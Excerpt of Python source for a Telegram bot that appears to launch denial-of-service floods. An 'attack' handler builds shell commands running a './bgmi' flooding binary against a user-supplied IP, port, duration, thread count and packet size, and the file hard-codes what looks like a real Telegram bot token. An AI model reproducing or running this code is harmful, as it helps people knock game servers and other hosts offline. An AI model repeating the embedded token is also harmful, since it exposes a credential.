...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7638236015:AAEeS4Q2ntPruZXMIB1nwALfZg5qfbYvCV8'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./bgmi {ip} {port} {duration} 20"
    elif argument_type == 4:
        attack_command = f"./bgmi {ip} {port} {duration} {threads} 20"
    elif argument_type == 5:
        attack_command = f"./bgmi {ip} {port} {duration} {byte_size} {threads} 20"
